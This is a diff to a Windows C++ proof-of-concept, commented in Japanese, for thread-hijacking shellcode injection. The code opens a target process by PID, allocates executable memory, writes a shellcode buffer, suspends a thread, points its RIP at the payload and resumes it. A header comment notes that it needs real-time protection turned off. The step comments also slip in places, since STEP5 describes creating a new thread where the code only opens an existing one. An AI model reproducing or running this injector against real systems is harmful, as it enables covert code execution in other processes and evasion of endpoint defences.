@@ -1,8 +1,9 @@
 /*
- * windowsのプロセスインジェクションのPOC
+ * windowsのスレッドインジェクションのPOC
  * リアルタイム保護をOFFにしないと動かない
  */
 #include <windows.h>
+#include <TlHelp32.h>
 #include <iostream>
 
 /*
@@ -39,57 +40,146 @@ int main(int argc, char* argv[]) {
     return 1;
   }
 
-  // PRTOCESS_ALL_ACCESS = 取得したプロセスハンドルに全アクセス権を要求
+  /* 
+   * STEP1)
+   * PRTOCESS_ALL_ACCESS = 取得したプロセスハンドルに全アクセス権を要求
+   */
   DWORD pid = DWORD(atoi(argv[1]));
   HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-  if (processHandle == NULL) {
+  if (!processHandle) {
     std::cout << "Failed to open the target process." << std::endl;
     return 1;
+  } else {
+    std::cout << "Opened target process successfully." << std::endl;
   }
   
-  // 取得したプロセスにシェルコードを入れるためのメモリ領域の確保
-  // PAGE_EXECUTE_READWRITE = 確保したメモリ領域を実行・読み・書き込み可能に設定
+  /* 
+   * STEP2)
+   * 取得したプロセスにシェルコードを入れるためのメモリ領域の確保
+   * PAGE_EXECUTE_READWRITE = 確保したメモリ領域を実行・読み・書き込み可能に設定
+   */
   LPVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(SHELLCODE), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-  if (remoteBuffer == NULL) {
+  if (!remoteBuffer) {
     std::cout << "Failed to allocate memory in the target process." << std::endl;
     CloseHandle(processHandle);
     return 1;
-  }
+  } else {
+    std::cout << "Allocated memory in target process successfully.\n";
+ }
   
-  // 取得したプロセスの確保したメモリ領域にシェルコード書き込み
+  /*
+   * SETP3)
+   * 取得したプロセスの確保したメモリ領域にシェルコード書き込み
+   */
   if (!WriteProcessMemory(processHandle, remoteBuffer, SHELLCODE, sizeof(SHELLCODE), NULL)) {
     std::cout << "Failed to write to the target process memory." << std::endl;
     VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
     CloseHandle(processHandle);
     return 1;
+  } else {
+    std::cout << "shellcode written to target process memory successfully.\n";
   }
   
+  // TH32CS_SNAPTHREADフラグを使用して、システム内のすべてのプロセス内のスレッドのスナップショットを作成。
+  // これにより、特定のプロセスに関連するスレッドを調べることができる。
   HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-  THREADENTRY32 threadEntry;
-  threadEntry.dwSize = sizeof(THREADENTRY32);
-  
-  if (Thread32First(snapshot, &threadEntry)) {
-    do {
-      if (threadEntry.th32OwnerProcessID == pid) {
-        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, threadEntry.th32ThreadID);
-        if (hThread) {
-          CONTEXT context = {0};
-          context.ContextFlags = CONTEXT_FULL;
-          if (GetThreadContext(hThread, &context)) {
-            context.Rip = (DWORD_PTR)remoteBuffer; // 64ビットシステム用
+  if (snapshot == INVALID_HANDLE_VALUE) {
+    std::cerr << "Failed to create snapshot of threads.\n";
+    CloseHandle(processHandle);
+    return 1;
+  }
 
-            SetThreadContext(hThread, &context);
-            ResumeThread(hThread);
-          }
-          CloseHandle(hThread);
-          break; // 最初に見つけたスレッドに対してのみ操作を行います
+  // THREADENTRY32構造体を初期化する。
+  THREADENTRY32 threadEntry{ sizeof(THREADENTRY32) };
+  
+  // Thread32First関数を使用して、スナップショット内の最初のスレッドの情報を取得
+  // 成功すると、Thread32Next関数を使用して、後続のスレッドを繰り返し処理できる。
+  if (!Thread32First(snapshot, &threadEntry)) {
+    std::cerr << "Failed to get first thread.\n";
+    CloseHandle(snapshot);
+    CloseHandle(processHandle);
+    return 1;
+  } else {
+    do {
+      /*
+       * STEP4)
+       * PIDにより、ハイジャックするプロセスを特定
+       * 各スレッドのオーナープロセスのIDと引数で受け取ったPIDを比較
+       */
+      if (threadEntry.th32OwnerProcessID == pid) {
+        
+        /*
+         * STEP5)
+         * プロセス内に新しくスレッドを作成
+         */
+        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT, FALSE, threadEntry.th32ThreadID);
+        if (!hThread) {
+          std::cerr << "Failed to open thread.\n";
+          continue;
         }
+        
+        /*
+         * STEP6)
+         * 作成したスレッドを一時停止
+         */
+        if (SuspendThread(hThread) == (DWORD)-1) {
+          std::cerr << "Failed to suspend thread.\n";
+          CloseHandle(hThread);
+          continue;
+        } else {
+          std::cout << "Thread suspended successfully.\n";
+        }
+
+        // 作成したスレッドのコンテキスト情報を核のするためのCONTEXT構造体を初期化
+        // CONTEXT_FULLを使用して、すべてのレジスタ情報を取得 
+        CONTEXT context{};
+        context.ContextFlags = CONTEXT_FULL;
+
+        /*
+         * STEP7)
+         * スレッドのコンテキストの取得
+         */
+        if (!GetThreadContext(hThread, &context)) {
+          std::cerr << "Failed to get thread context.\n";
+          // 失敗した場合も一時停止しているスレッドを再開してプログラムの整合性を保つ（クリーンアップ）
+          ResumeThread(hThread);
+        } else {
+           /*
+            * STEP8)
+            * スレッドのRIPレジスタをメモリ内に注入したシェルコードのアドレスに書き換える
+            */
+           std::cout << "Got thread context successfully.\n";
+           context.Rip = reinterpret_cast<DWORD_PTR>(remoteBuffer);
+
+           /*
+            * STEP9)
+            * 変更されたコンテキスト（上記のRIP）をスレッドに反映
+            */
+           if (!SetThreadContext(hThread, &context)) {
+             std::cerr << "Failed to set thread context.\n";
+           } else {
+             std::cout << "Thread context set successfully.\n";
+           }
+
+           /* 
+            * STEP10)
+            * 一時停止してあるスレッドを再開し、シェルコードを実行させる。
+            */
+           if (ResumeThread(hThread) == (DWORD)-1) {
+             std::cerr << "Failed to resume thread.\n";
+           } else {
+             std::cout << "Thread resumed successfully.\n";
+             break;
+           } 
+        }
+        CloseHandle(hThread);
       }
+
     } while (Thread32Next(snapshot, &threadEntry));
   }
 
-    CloseHandle(snapshot);
-    CloseHandle(processHandle);
+  CloseHandle(snapshot);
+  CloseHandle(processHandle);
   
   return 0;
 } 
